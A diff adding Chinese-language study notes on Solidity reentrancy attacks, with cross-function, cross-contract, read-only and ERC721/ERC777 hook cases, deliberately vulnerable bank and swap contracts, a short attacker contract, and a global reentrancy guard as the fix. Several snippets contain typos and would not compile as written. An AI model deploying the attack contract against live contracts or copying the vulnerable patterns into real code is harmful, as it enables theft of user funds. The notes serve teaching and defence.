@@ -3219,4 +3219,215 @@ import '@openzeppelin/contracts/access/Ownable.sol';
     ```
     - 解决方法：检查-影响-交互模式（checks-effect-interaction）和重入锁 [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
 - [104-S17] “跨服”重入攻击
+    - 生产环境中的例子，“跨服”是一个概括，从某一个函数开始入手，但是攻击对象却是其他函数/合约/项目等等。
+    - 跨函数重入攻击
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity 0.8.17;
 
+    contract VulnerableBank {
+        mapping(address => uint256) public balances;
+
+        uint256 private _status;  // 重入锁
+        modifier nonReentrant() { // 重入锁
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function deposit() external payable {
+            require(msg.value > 0, "Deposit amount must ba greater than 0");
+            balances[msg.sender] += msg.value;
+        }
+
+        function withdraw(uint256 _amount) external nonReentrant {
+            uint256 balance = balances[msg.sender];
+            require(balance >= _amount, "Insufficient balance");
+
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            require(success, "Withdraw failed");
+
+            balances[msg.sender] = balance - _amount;
+        }
+
+        function transfer(address _to, uint256 _amount) external {
+            uint256 balance = balances[msg.sender];
+            require(balance >= _amount, "Insufficient balance");
+
+            balances[msg.sender] -= _amount;
+            balances[_to] += _amount;
+        }
+    }
+    ```
+    - 攻击示例：
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity 0.8.17;
+    import "../IVault.sol";
+    contract Attack2Contract {
+        address victim;
+        address owner;
+
+        constructor(address _victim, address _owner) {
+            victim = _victim;
+            owner = _owner;
+        }
+
+        function deposit() external payable {
+            IVault(victim).deposit{value: msg.value}("");
+        }
+
+        function withdraw() external {
+            Ivault(victim).withdraw();
+        }
+
+        receive() external payable {
+            uint256 balance = Ivault(victim).balances[address(this)];
+            Ivault(victim).transfer(owner, balance);
+        }
+    }
+    ```
+    - 分析：这里的 transfer 里没有加锁，导致跨函数重入。
+    - 进阶案例：如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？
+    - 跨合约重入攻击
+    案例：第一个合约是TwoStepSwapManager, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是TwoStepSwapExecutor, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。
+    ```solidity
+    // 合约一：
+    contract TwoStepSwapManager {
+        struct Swap {
+            address user;
+            uint256 amount;
+            address[] swapPath;
+            bool unwrapnativeToken;
+        }
+
+        uint256 swapNonce;
+        mapping(uint256 => Swap) pendingSwaps;
+
+        uint256 private _status;
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;        // 调用结束，将 _status 恢复为0
+            _status = 0;
+        }
+
+        function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant {
+            IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);
+            pendingSwaps[++swapNounce] = Swap({
+                user: msg.sender,
+                amount: _amount,
+                swapPath: _swapPath,
+                unwrapNativeToken: _unwrapNativeToken
+            });
+        }
+
+        function cancelSwap(uint256 _id) external nonReentrant {
+            Swap memory swap = pendingSwaps[_id];
+            require(swap.user == msg.sender);
+            delete pendingSwaps[_id];
+
+            IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);
+        }
+    }
+    // 合约二：
+    pragma solidity 0.8.17;
+    contract TwoStepSwapExecutor {
+        uint256 private _status; // 重入锁
+
+        // 略
+
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant {
+            Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);
+
+            // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user
+            ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);
+            ISwapManager(swapManager).delete(pendingSwaps[_id]);
+        }
+    }
+    ```
+    - 漏洞：这两个合约锁的状态是不互通的，当运行到 swap() 的时候，发起 ETH 转账，将执行权交给了攻击者的恶意合约的 fallback 函数，在那里被设置了对 TwoStepSwapManager 合约的 cancelSwap 函数的调用，而此时这个合约的重入锁还是0，所以cancelSwap开始执行，攻击者收到了 executeSwap 发送给他的 swap 过来的 ETH，同时还收到了 cancelSwap 退给他的当初送出去用来 swap 的本金。
+    - 防范措施：全局重入锁，建立一个单独的合约用来储存重入状态，然后在系统里的任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态。
+    ```solidity
+    pragma solidity ^0.8.0;
+    import "../data/Keys.sol";
+    import "../data/DataStore.sol";
+    abstract contract GlobalReentrancyGuard{
+        uint256 private constant NOT_ENTERED = 0;
+        uint256 private constant ENTERED = 1;
+
+        DataStore public immutable dataStore;
+
+        constructor(DataStore _datastore) {
+            dataStore = _dataStore;
+        }
+
+        modifier globalNonReentrant() {
+            _nonReentrantBefore();
+            _;
+            _nonReentrantAfter();
+        }
+
+        function _nonReentrantBefore() private {
+            uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);
+
+            require(status == NOT_ENTERED, "ReentrancyGuard: reentrant call");
+
+            dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);
+        }
+
+        function _nonReentrantAfter() private {
+            dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);
+        }
+    }
+    ```
+    - 跨项目重入攻击（只读重入攻击 Read-Only Reentrancy）
+    ```solidity
+    pragma solidity 0.8.17;
+
+    contract VulnerableBank {
+        mapping(address => uint256) public balances;
+
+        uint256 private _status; // 重入锁
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function deposit() external payable {
+            require(msg.value > 0, "Deposit amount must ba greater than 0");
+            balances[msg.sender] += msg.value;
+        }
+
+        function withdraw(uint256 _amount) external nonReentrant {
+            require(_amount > 0, "Withdrawal amount must be greater than 0");
+            require(isAllowedToWithdraw(msg.sender, _amount), "Insufficient balance");
+
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            require(success, "Withdraw failed");
+
+            balances[msg.sender] -= _amount;
+        }
+
+        function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) { // 漏洞点：利用重入信息更新滞后攻击依赖这个作为判断的其他项目
+            return balances[_user] >= _amount;
+        }
+    }
+    ```
+    - ERC721 & ERC777 Reentrancy
+    ```solidity
+    // ERC721
+    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);
+    // ERC777
+    function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;
+    ```
